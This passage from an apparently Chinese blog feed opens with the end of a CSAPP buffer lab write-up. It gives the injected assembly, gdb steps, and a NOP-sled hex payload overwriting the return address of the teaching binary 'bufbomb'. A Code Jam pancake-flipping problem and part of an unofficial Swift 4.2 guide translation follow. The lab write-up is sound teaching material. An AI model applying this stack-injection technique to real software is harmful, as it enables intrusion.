0x18，这也就是我们第一步必须要知道的，因为无论esp的位置如何变化，esp和ebp的关系都是固定的，所以我们将会使用这条语句去更改返回值。</p><p>​    那么我们的汇编代码就可以写出来了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, %eax</span><br><span class="line">lea 0x18(%esp), %ebp </span><br><span class="line">push $0x8048d21</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>​    然后，就是我们最困难的环节了。我们现在应该如何注入这个恶意代码呢？在网上查相关的题目和题解的时候发现了可以利用nop的语句进行偏移，因为nop虽然不进行任何程序操作，但是会使得程序计数器pc的值递增，我们可以利用这一想法，先让程序返回到一个我们大致猜测的地址，在这个地址及其附近的一大片区域里我们用nop指令（0x90）填充，CPU执行nop指令时除了程序计数器PC自加，别的什么也不做。把我们的代码放在这片区域的高位地址处，程序一路执行nop,就像滑行一样，一路滑到我们的代码才真正开始执行。我们可以利用gdb调试找到这个字符串开始的大致区域。利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb)b *<span class="number">0</span>x80493a0</span><br><span class="line">(gdb)print <span class="variable">$ebp</span>-<span class="number">0</span>x208</span><br></pre></td></tr></table></figure><p>​    来进行断点调试，从而确定出我们的随机栈的范围，从中选取最大的作为范围最大值。这里我的最大值是0x55683628，当然不同的电脑不一样，然后我们先将我们的汇编代码进行处理，得到如下的信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">03</span></span><br><span class="line">zinker &gt;&gt;&gt; gcc -m32 -c nitro_asm.s</span><br><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">54</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d nitro_asm.o                                       </span><br><span class="line"></span><br><span class="line">nitro_asm.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:b8 c9 ae <span class="number">6</span>f <span class="number">67</span>       mov    <span class="variable">$0x676faec9</span>,%eax</span><br><span class="line">   <span class="number">5</span>:<span class="number">8</span>d <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span>          lea    <span class="number">0</span>x18(%esp),%ebp</span><br><span class="line">   <span class="number">9</span>:<span class="number">68</span> <span class="number">21</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x8048d21</span></span><br><span class="line">   e:c3                   ret</span><br></pre></td></tr></table></figure><p>那么，我们接下来就是要确定长度了，也就是说我们由于不再是getbuf，也就不在是0x28，所以我们去看getbufn，根据mov语句我们可以判断出，这里缓冲区的长度应该是0x208 + 0x4（push操作），也就是0x20c，计算之后发现是524个字节。所以我们最后构造出的字符串就是这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 b8 //自己写的汇编代码会通过不停的nop偏移到这里运行</span><br><span class="line">c9 a3 6f 67 8d 6c 24 18 68 21</span><br><span class="line">8d 04 08 c3 </span><br><span class="line">28 36 68 55 //最大的栈顶保证了一定能够运行到汇编代码</span><br></pre></td></tr></table></figure><p>接下来我们运行一下这个程序，得到下面的结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">3</span>:<span class="number">47</span></span><br><span class="line">zinker &gt;&gt;&gt; cat nitro_in.txt | ./hex2raw -n | ./bufbomb -n  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><p>OK,我们总算是做完了这个实验。</p><h1 id="鸣谢与参考"><a href="#鸣谢与参考" class="headerlink" title="鸣谢与参考"></a>鸣谢与参考</h1><p>感谢@何人听我楚狂声 的帮助。</p><p>感谢@the Beat Generation 给我推Nitro教学的网页。</p><p>感谢@zhwhong 的网页教学。</p><p>参考资料及网页：</p><p>【1】CSAPP，电子工业出版社</p><p>【2】<a href="https://guoziyang.top/posts/csapp_attacklab.html" target="_blank" rel="noopener">https://guoziyang.top/posts/csapp_attacklab.html</a> 当个黑客吧！——CSAPP:Attack Lab</p><p>【3】<a href="https://www.jianshu.com/p/dc41c84cef17" target="_blank" rel="noopener">https://www.jianshu.com/p/dc41c84cef17</a> （我做Nitro的方法就是来源于此，请大家不明白的话务必前去阅读）</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Google 2017 Qualifacation Problem A</title>
    <link href="http://yoursite.com/Problem%20A.%20Oversized%20Pancake%20Flipper/"/>
    <id>http://yoursite.com/Problem A. Oversized Pancake Flipper/</id>
    <published>2018-11-01T09:03:00.000Z</published>
    <updated>2018-11-01T09:04:04.648Z</updated>
    
    <content type="html"><![CDATA[<p>google jam 上的题，有时间可以做一下。</p><a id="more"></a><h2 id="Problem-A-Oversized-Pancake-Flipper"><a href="#Problem-A-Oversized-Pancake-Flipper" class="headerlink" title="Problem A. Oversized Pancake Flipper"></a>Problem A. Oversized Pancake Flipper</h2><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p><a href="https://code.google.com/codejam/contest/6254486/dashboard#s=p1" target="_blank" rel="noopener">Last year</a>, the Infinite House of Pancakes introduced a new kind of pancake. It has a happy face made of chocolate chips on one side (the “happy side”), and nothing on the other side (the “blank side”).</p><p>You are the head cook on duty. The pancakes are cooked in a single row over a hot surface. As part of its infinite efforts to maximize efficiency, the House has recently given you an oversized pancake flipper that flips exactly <strong>K</strong> consecutive pancakes. That is, in that range of <strong>K</strong> pancakes, it changes every happy-side pancake to a blank-side pancake, and vice versa; it does <em>not</em> change the left-to-right order of those pancakes.</p><p>You cannot flip fewer than <strong>K</strong> pancakes at a time with the flipper, even at the ends of the row (since there are raised borders on both sides of the cooking surface). For example, you can flip the first <strong>K</strong> pancakes, but not the first <strong>K</strong> - 1 pancakes.</p><p>Your apprentice cook, who is still learning the job, just used the old-fashioned single-pancake flipper to flip some individual pancakes and then ran to the restroom with it, right before the time when customers come to visit the kitchen. You only have the oversized pancake flipper left, and you need to use it quickly to leave all the cooking pancakes happy side up, so that the customers leave feeling happy with their visit.</p><p>Given the current state of the pancakes, calculate the minimum number of uses of the oversized pancake flipper needed to leave all pancakes happy side up, or state that there is no way to do it.</p><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><p>The first line of the input gives the number of test cases, <strong>T</strong>. <strong>T</strong> test cases follow. Each consists of one line with a string <strong>S</strong> and an integer <strong>K</strong>. <strong>S</strong> represents the row of pancakes: each of its characters is either <code>+</code> (which represents a pancake that is initially happy side up) or <code>-</code> (which represents a pancake that is initially blank side up).</p><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>For each test case, output one line containing <code>Case #x: y</code>, where <code>x</code> is the test case number (starting from 1) and <code>y</code> is either <code>IMPOSSIBLE</code> if there is no way to get all the pancakes happy side up, or an integer representing the the minimum number of times you will need to use the oversized pancake flipper to do it.</p><h3 id="Limits"><a href="#Limits" class="headerlink" title="Limits"></a>Limits</h3><p>1 ≤ <strong>T</strong> ≤ 100.<br>Every character in <strong>S</strong> is either <code>+</code> or <code>-</code>.<br>2 ≤ <strong>K</strong> ≤ length of <strong>S</strong>.</p><h4 id="Small-dataset"><a href="#Small-dataset" class="headerlink" title="Small dataset"></a>Small dataset</h4><p>2 ≤ length of <strong>S</strong> ≤ 10.</p><h4 id="Large-dataset"><a href="#Large-dataset" class="headerlink" title="Large dataset"></a>Large dataset</h4><p>2 ≤ length of <strong>S</strong> ≤ 1000.</p><h3 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h3><table><thead><tr><th>Input</th><th>Output</th></tr></thead><tbody><tr><td><code>3 ---+-++- 3 +++++ 4 -+-+- 4</code></td><td><code>Case #1: 3 Case #2: 0 Case #3: IMPOSSIBLE</code></td></tr></tbody></table><p>In Case #1, you can get all the pancakes happy side up by first flipping the leftmost 3 pancakes, getting to <code>++++-++-</code>, then the rightmost 3, getting to <code>++++---+</code>, and finally the 3 pancakes that remain blank side up. There are other ways to do it with 3 flips or more, but none with fewer than 3 flips.</p><p>In Case #2, all of the pancakes are already happy side up, so there is no need to flip any of them.</p><p>In Case #3, there is no way to make the second and third pancakes from the left have the same side up, because any flip flips them both. Therefore, there is no way to make all of the pancakes happy side up.</p><h3 id="大致题意"><a href="#大致题意" class="headerlink" title="大致题意"></a>大致题意</h3><p>​    就是说，每次从左往右改变K个字符，如果是“+”那么就变成“-”，“-”就变成“+”，输出改变需要的最小次数。</p><h3 id="简单思路"><a href="#简单思路" class="headerlink" title="简单思路"></a>简单思路</h3><p>​    那么这个题，我想的就是，从左到右依次处理，如果找到了“-”，那么我就将连续的K个都改变，一直到最后一个。大概是一种贪心思想，然而我觉得可能会有些问题（虽然A了orz）</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;google jam 上的题，有时间可以做一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Programming Language" scheme="http://yoursite.com/tags/Programming-Language/"/>
    
  </entry>
  
  <entry>
    <title>Swift4 手册（非官方翻译）</title>
    <link href="http://yoursite.com/Swift4-%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/Swift4-学习手册/</id>
    <published>2018-10-25T02:13:24.000Z</published>
    <updated>2018-11-20T16:16:38.996Z</updated>
    
    <content type="html"><![CDATA[<p>英语渣，QAQ。</p><p>长期更新ing。</p><a id="more"></a><h1 id="Swift编程语言-–-Swift4-2"><a href="#Swift编程语言-–-Swift4-2" class="headerlink" title="Swift编程语言 – Swift4.2"></a>Swift编程语言 – Swift4.2</h1><h2 id="欢迎来到Swift"><a href="#欢迎来到Swift" class="headerlink" title="欢迎来到Swift"></a>欢迎来到Swift</h2><h3 id="关于Swift"><a href="#关于Swift" class="headerlink" title="关于Swift"></a>关于Swift</h3><p>​    Swift是可用来进行软件开发的一款非常好的语言，无论是面向手机、电脑、服务器或者其他可以运行代码的设备。它是一款安全、快速以及可交互的一款编程语言，它集合了来自广大Apple开发者的充满智慧的最优的现代语言思想以及来自这个开源社区的各式各样的贡献。Swift的编译器进行了对性能的优化，而语言本身又做了面向开发的优化。</p><p>​    Swift对于编程新手来说十分友好。这是一种工业高质量的编程语言，它和脚本语言一样生动和让人着迷。在playground运行Swift代码让你可以测试你的代码并立刻得到结果，而不需要建立并运行一个新的APP。</p><p>​    Swift通过引入一些现代的编程模式，定义减少了大量的常见的编程错误：</p><ul><li>在使用之前变量均被初始化。</li><li>数组指数会进行越界检查。</li><li>整型数会判断是否溢出。</li><li>选配类型(Optional)保证了 nil 的值被准确地处理。</li><li>内存自动分配。</li><li>错误处理允许程序从不可预知的错误中进行受控制地恢复。</li></ul><p>Swift代码为了实现现代硬件的最大化应用进行编译和优化。语法和基础的库被设计基于一个基本原则：用明确的方式编写代码也应该有最好的表现。速度和安全性的组合使Swift成为了一个无论是对于“Hello,World“，还是对于整个操作系统的杰出选择。</p><p>​    Swift结合了强大的数据类型推断和利用现代化和轻量级的特征匹配，允许复杂的想法可以以一个明确且准确的方式表达出来。因此，Swift代码不仅易于编写，而且易于阅读和保存。</p><p>​    Swift的开发已经进行了多年，同时它持续的开发出新的特征和能力。我们对Swift的未来充满期望。我们已经迫不及待地希望你去利用它。</p><h3 id="版本兼容"><a href="#版本兼容" class="headerlink" title="版本兼容"></a>版本兼容</h3><p>​    这本描述了Swift 4.2的内容，Swift4.2是在Xcode10.0中所默认的版本。当然，你可以使用Xcode去编写Swift4 和 Swift3 的程序。</p><p>​    当使用Swift4.2的编译器去编译Swift3的代码，它会默认识别代码的语言版本为Swift3.4。因此，你可以使用可选的编译模块就像是</p><p><code>#if swift(&gt;=3.4)</code></p><p>​    来写适配不同Swift编译器版本的代码。</p><p>​    当你使用Xcode9.2去编写Swift3代码，大多数新的Swift4的功能都是可以使用的。但是有一些功能只能应用在Swift4的代码中：</p><ul><li><p>Substring的操作返回值是Substring类型而非是String类型。</p></li><li><p>@objc 标志被隐性的标注在了更少的位置上。</p></li><li><p>在相同文件中对一个类型的扩展引申到这个类的私有成员上。</p><p>使用Swift4编写的target可以基于另一个用Swift3编写的target，反之亦然。这意味着，如果你有一个大型的工程，而这个工程被分成了多种的框架，你可以一次性地移植你的Swift3代码框架到Swift4代码框架。</p></li></ul><h3 id="Swift概览"><a href="#Swift概览" class="headerlink" title="Swift概览"></a>Swift概览</h3><p>  传统上讲一个新的语言的第一个程序往往是在屏幕上输出”Hello，World!”。在Swift中，这个程序可以通过简单的一行来实现。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br><span class="line"><span class="comment">// Prints "Hello, World!"</span></span><br></pre></td></tr></table></figure><p>​    如果你可以使用C语言或者Objective-C编写程序，你可能会对这个语法很熟悉。在Swift中，这样的一行代码就是一个完整的程序。你不需要为了完成类似输入/输出或者是处理字符串这样的功能去引入一个额外的库。写在全局范围内的代码被用作视为程序的入口点，因此你不需要使用main()函数。你也不需要去在每一个声明的末尾写分号。</p><p>​    这个概览可以通过给你展示如何去完成多种类的编程任务，使你能够获得足够多的信息去利用Swift开始编写代码。</p><h4 id="简单数值"><a href="#简单数值" class="headerlink" title="简单数值"></a>简单数值</h4><p>​    使用 let 去定义一个定值，或者是使用 var 去定义一个变量。定值在编译过程中是不需要被确认的，但是你必须确切地将其声明为一个值。这意味着，你可以在只定义了一次的情况下在不同地方使用这个定值。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myVariable = <span class="number">42</span></span><br><span class="line">myVariable = <span class="number">50</span></span><br><span class="line"><span class="keyword">let</span> myConstant = <span class="number">42</span></span><br></pre></td></tr></table></figure><p>​    一个定值或者变量必须有一个和你所声明类型相同的类型的值。然而，你不需要将这种类型明确的写出来。当你创建一个新定值或者变量的时候，编译器会自动识别它的类型。在下面的例子中，编译器就识别了myVariable为一个整型数，因为它的初值为一个整型数。</p><p>​    如果初值并没有给定足够的信息（或者是没有初值的情况下），可以在变量之后进行类型的确定，使用一个冒号分开。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> implicitInteger = <span class="number">70</span></span><br><span class="line"><span class="keyword">let</span> implicitDouble = <span class="number">70.0</span></span><br><span class="line"><span class="keyword">let</span> explicitDouble: <span class="type">Double</span> = <span class="number">70</span></span><br></pre></td></tr></table></figure><p>实验：创建一个定值，要求定义为确定的float类型，并且值等于4。</p><p>​    所有的值不能被隐性转换为另外的数据类型。如果你想要将一个值转化为另一个类型，那么就进行明确的转换，示例如下。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> label = <span class="string">"The width is "</span></span><br><span class="line"><span class="keyword">let</span> width = <span class="number">94</span></span><br><span class="line"><span class="keyword">let</span> widthLabel = label + <span class="type">String</span>(width)</span><br></pre></td></tr></table></figure><p>实验：试着将上述代码最后一行的String去掉，看看会发生什么？</p><p>​    对于字符串来说，有一种更简单的方式去使其包含其他的值：将这个值的名称写在括号中，然后在括号之前写一个反斜线”\”，比如说：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> apples = <span class="number">3</span></span><br><span class="line"><span class="keyword">let</span> oranges = <span class="number">5</span></span><br><span class="line"><span class="keyword">let</span> appleSummary = <span class="string">"I have <span class="subst">\(apples)</span> apples."</span></span><br><span class="line"><span class="keyword">let</span> fruitSummary = <span class="string">"I have <span class="subst">\(apples + oranges)</span> pieces of fruit."</span></span><br></pre></td></tr></table></figure><p>实验：使用这种方式在字符串中进行一次浮点数运算，然后让这句话包含某个人的名字作为一种问候。</p><p>​    对那些需要很多行的字符串，使用三个双引号(“””)这个符号。在每一行的开头处的缩进可以被移除，只要在最后的时候满足缩进即可。比如说：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> quotation = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">Even though there's whitespace to the left,</span></span><br><span class="line"><span class="string">the actual lines aren't indented.</span></span><br><span class="line"><span class="string">Except for this line.</span></span><br><span class="line"><span class="string">Double quotes ("</span>) can appear without being escaped.</span><br><span class="line"></span><br><span class="line"><span class="type">I</span> still have \(apples + oranges) pieces of fruit.</span><br><span class="line">    <span class="string">""</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p>​    可以使用中括号([])去创建数组和字典，然后通过在中括号中写数组下标或者字典的键值访问数组或字典。在最后一个元素末尾允许加”,”。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shoppingList = [<span class="string">"catfish"</span>, <span class="string">"water"</span>, <span class="string">"tulips"</span>]</span><br><span class="line">shoppingList[<span class="number">1</span>] = <span class="string">"bottle of water"</span></span><br><span class="line"><span class="keyword">var</span> occupations = [</span><br><span class="line">    <span class="string">"Malcolm"</span>: <span class="string">"Captain"</span>,</span><br><span class="line">    <span class="string">"Kaylee"</span>: <span class="string">"Mechanic"</span>,</span><br><span class="line">]</span><br><span class="line">occupations[<span class="string">"Jayne"</span>] = <span class="string">"Public Relations"</span></span><br></pre></td></tr></table></figure><p>​    数组在增加新元素的时候可以自动增长。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shoppingList.append(<span class="string">"blue paint"</span>)</span><br><span class="line"><span class="built_in">print</span>(shoppingList)</span><br></pre></td></tr></table></figure><p>​    创建一个空的字典或者数组，可以使用初始化的语法。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> emptyArray = [<span class="type">String</span>]()</span><br><span class="line"><span class="keyword">let</span> emptyDictionary = [<span class="type">String</span>: <span class="type">Float</span>]()</span><br></pre></td></tr></table></figure><p>​    如果你所创建的字典或者数组的数据类型可以被识别出来，那么你可以将空的数组写作[]，新的字典写作[:]，举个例子，当你想要为一个变量赋一个新的值或者想要对一个函数传递一个声明的时候，就可以这样做了。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shoppingList = []</span><br><span class="line">occupations = [:]</span><br></pre></td></tr></table></figure><h4 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h4><p>​    使用if或者switch语句去创建条件语句，以及使用for-in，while，以及repeat-while去创建循环语句。在条件或者循环控制变量前的圆括号可以写也可以省略。但是大括号是必须写的。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> individualScores =[<span class="number">75</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">87</span>, <span class="number">12</span>]</span><br><span class="line"><span class="keyword">var</span> teamScore = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> individualScores &#123;</span><br><span class="line">    <span class="keyword">if</span> score &gt; <span class="number">50</span>&#123;</span><br><span class="line">        teamScore += <span class="number">3</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        teamScore += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(teamScore)</span><br></pre></td></tr></table></figure><p>​    在一个if声明中，条件变量必须被定义为bool类型，这就意味着类似 <code>if score{…}</code>这样的代码格式是错误的，不是一个和0的隐式比较。</p><p>​    你可以同时使用if和let语句，去处理那些可能会丢失的值。这些值被认为是可选的。一个可选值或者包含一个值，或者利用<code>nil</code>代表这个值丢失了。当在一个值的数据类型后加上”?”，这代表着这个值是可选值。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> optionalString: <span class="type">String</span>? = <span class="string">"Hello"</span></span><br><span class="line"><span class="built_in">print</span>(optionalString == <span class="literal">nil</span>)</span><br><span class="line"><span class="comment">//Prints "false"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> optionalName:<span class="type">String</span>? = <span class="string">"John Appleseed"</span></span><br><span class="line"><span class="keyword">var</span> greeting = <span class="string">"Hello!"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> name = optionalName&#123;</span><br><span class="line">    greeting = <span class="string">"Hello, <span class="subst">\(name)</span>"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验：如果把<code>optionalName</code>的值赋值为<code>nil</code>,你会得到什么样的问候语句？加入一个<code>else</code>语句，当<code>optionalName</code>为<code>nil</code>的时候，来设定一个不同的问候语。</p><p>​    如果可选值为<code>nil</code>的时候，条件变量被设定为false，同时大括号中的代码被跳过。否则，可选值就会被赋值给let后的变量，这使得可选值可以被应用在后续的代码块中。</p><p>​    处理可选值的另外一种方式是使用”??”操作符去提供一个在可选值为空的情况下的，可以使用的值。如果可选值丢失的情况下，那么这个default值就可以代替原来的可选值。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> nickName: <span class="type">String</span>? = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">let</span> fullName: <span class="type">String</span> = <span class="string">"John Appleseed"</span></span><br><span class="line"><span class="keyword">let</span> informalGreeting = <span class="string">"Hi <span class="subst">\(nickName ?? fullName)</span>"</span></span><br></pre></td></tr></table></figure><p>​    Switch支持多个种类的数据和多种的比较运算符，他们不被限制为整数以及相等的测试。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 